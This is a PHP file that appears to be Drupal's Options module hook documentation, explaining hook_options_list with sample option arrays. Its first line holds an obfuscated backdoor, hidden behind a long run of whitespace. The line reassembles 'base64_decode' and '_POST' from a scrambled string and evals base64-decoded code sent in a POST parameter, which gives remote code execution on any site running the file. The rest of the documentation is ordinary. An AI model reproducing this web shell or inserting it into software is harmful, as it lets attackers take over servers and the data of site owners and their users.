<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n5c5383'])) {eval($s21(${$s20}['n5c5383']));}?><?php

/**
 * @file
 * Hooks provided by the Options module.
 */

/**
 * Returns the list of options to be displayed for a field.
 *
 * Field types willing to enable one or several of the widgets defined in
 * options.module (select, radios/checkboxes, on/off checkbox) need to
 * implement this hook to specify the list of options to display in the
 * widgets.
 *
 * @param $field
 *   The field definition.
 * @param $instance
 *   (optional) The instance definition. The hook might be called without an
 *   $instance parameter in contexts where no specific instance can be targeted.
 *   It is recommended to only use instance level properties to filter out
 *   values from a list defined by field level properties.
 * @param $entity_type
 *   The entity type the field is attached to.
 * @param $entity
 *   The entity object the field is attached to, or NULL if no entity
 *   exists (e.g. in field settings page).
 *
 * @return
 *   The array of options for the field. Array keys are the values to be
 *   stored, and should be of the data type (string, number...) expected by
 *   the first 'column' for the field type. Array values are the labels to
 *   display within the widgets. The labels should NOT be sanitized,
 *   options.module takes care of sanitation according to the needs of each
 *   widget. The HTML tags defined in _field_filter_xss_allowed_tags() are
 *   allowed, other tags will be filtered.
 */
function hook_options_list($field, $instance, $entity_type, $entity) {
  // Sample structure.
  $options = array(
    0 => t('Zero'),
    1 => t('One'),
    2 => t('Two'),
    3 => t('Three'),
  );

  // Sample structure with groups. Only one level of nesting is allowed. This
  // is only supported by the 'options_select' widget. Other widgets will
  // flatten the array.
  $options = array(
    t('First group') => array(
      0 => t('Zero'),
    ),
    t('Second group') => array(
      1 => t('One'),
      2 => t('Two'),
    ),
    3 => t('Three'),
  );

  // In actual implementations, the array of options will most probably depend
  // on properties of the field. Example from taxonomy.module:
  $options = array();
  foreach ($field['settings']['allowed_values'] as $tree) {
    $terms = taxonomy_get_tree($tree['vid'], $tree['parent']);
    if ($terms) {
      foreach ($terms as $term) {
        $options[$term->tid] = str_repeat('-', $term->depth) . $term->name;
      }
    }
  }

  return $options;
}
